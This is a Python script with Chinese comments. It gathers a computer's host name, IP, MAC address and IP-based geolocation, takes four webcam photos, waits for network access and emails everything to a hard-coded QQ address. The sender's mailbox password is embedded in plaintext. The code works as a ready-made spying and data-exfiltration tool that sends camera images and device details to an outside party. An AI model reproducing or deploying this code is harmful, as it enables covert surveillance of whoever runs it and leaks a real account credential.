import uuid
import requests
import socket




def get_host_name():
    #获取本机电脑名
    myname = socket.getfqdn(socket.gethostname())
    return myname

def get_host_ip():
    #获取本机ip
    myaddr = socket.gethostbyname(get_host_name())
    return myaddr 


#获取mac
def get_mac_address(): 
    mac=uuid.UUID(int = uuid.getnode()).hex[-12:] 
    return ":".join([mac[e:e+2] for e in range(0,11,2)])

#获取经纬度信息
def get_addr_info():
    try:
        html = requests.get("http://ip-api.com/json",timeout=2).text
        return html
    except:
        return 'error'
    return ''

#获取地址
def get_addr():
    try:
        html = requests.get("http://pv.sohu.com/cityjson",timeout=2).text
        return html
    except:
        return 'error'
    return ''
    # city_info=requests.get('http://pv.sohu.com/cityjson',timeout=2)
    # print(city_info.text)
    # addr=city_info.split('=')[1].split(',')[2].split('"')[3] #取出地址信息

#判断是否有网
def isConnected():
    try:
        html = requests.get("http://www.baidu.com",timeout=2)
    except:
        return False
    return True    


import cv2
import os
import threading
import time




print("=============================================")
print("=  会自动拍4张照片！                         =")
print("=============================================")
print()

flag = True
index = 1
cap = cv2.VideoCapture(0)
width = 640
height = 480
w = 360
cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)

crop_w_start = (width-w)//2
crop_h_start = (height-w)//2

print(width, height)
img_path = "image"
if os.path.exists(img_path) is False:
    os.mkdir(img_path)

#拍照方法     
# def camera_func():
#     global index
#     while flag:
#         time.sleep(5)
#         cv2.imwrite("%s/%d.jpeg" % (img_path, index),
#                     cv2.resize(frame, (640, 480), interpolation=cv2.INTER_AREA))
#         print("%s: %d 张图片" % (img_path, index))
#         index += 1

#拍照线程启动
# timer = threading.Timer(5, camera_func)
# timer.start()
while True:
    # get a frame
    ret, frame = cap.read()
    # show a frame
    frame = frame[crop_h_start:crop_h_start+w, crop_w_start:crop_w_start+w]
    frame = cv2.flip(frame,1,dst=None)
    #cv2.imshow("capture", frame)
    cv2.imwrite("%s/%d.jpeg" % (img_path, index),frame)
    print("%s: %d 张图片" % (img_path, index))
    index += 1
    if(index >= 5):
        print("end")
        break
    time.sleep(5)
    # input = cv2.waitKey(1) & 0xFF
    # class_name = img_path 
    # if input == ord('q'):
    #     flag = False
    #     break
cap.release()
#cv2.destroyAllWindows()

# coding=utf-8
import smtplib
import os
from email.mime.text import MIMEText
 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
 
msg_from = '2514770860@qq.com'  # 发送方邮箱
passwd = 'zgfrdshjvdgedjab'  # 填入发送方邮箱的授权码
msg_to = '455038141@qq.com'  # 收件人邮箱

def send():
    subject = "python邮件测试"  # 主题
    msg = MIMEMultipart('related')

    body = '''
        <img src="cid:imageid1" alt="imageid1">
        <br>
        <img src="cid:imageid2" alt="imageid2">
        <br>
        <img src="cid:imageid3" alt="imageid3">
        <br>
        <img src="cid:imageid4" alt="imageid4">
        <br>
        HostName:<p>%s</p><br>
        HostIP:<p>%s</p><br>
        HostMac:<p>%s</p><br>
        HostAddrInfo:<p>%s</p><br>
        HostAddr:<p>%s</p><br>
    '''% (get_host_name(),get_host_ip(),get_mac_address(),get_addr_info(),get_addr())
    content = MIMEText('<html><body>'+body+'</body></html>', 'html', 'utf-8')  # 正文
    # msg = MIMEText(content)
    msg.attach(content)
    msg['Subject'] = subject
    msg['From'] = msg_from
    msg['To'] = msg_to
    
    for root, dirs, files in os.walk("./image"):
         # 遍历文件
        count = 1
        for f in files:
            # print(os.path.join(root, f))
            file = open(os.path.join(root, f),'rb')
            img_data = file.read()
            file.close()
            img = MIMEImage(img_data)
            iid = "imageid" + str(count)
            print(iid)
            img.add_header('Content-ID',iid)
            msg.attach(img)
            count += 1
    
    # file = open("./image/1.jpeg", "rb")
    # img_data = file.read()
    # file.close()
 
    # img = MIMEImage(img_data)
    # img.add_header('Content-ID', 'imageid')
    # msg.attach(img)
 
    try:
        s = smtplib.SMTP_SSL("smtp.qq.com", 465)  # 邮件服务器及端口号
        s.login(msg_from, passwd)
        s.sendmail(msg_from, msg_to, msg.as_string())
        print("send email success")
    except:
        print("error")



# camera_()
while isConnected() is False:
    time.sleep(5)
send() 
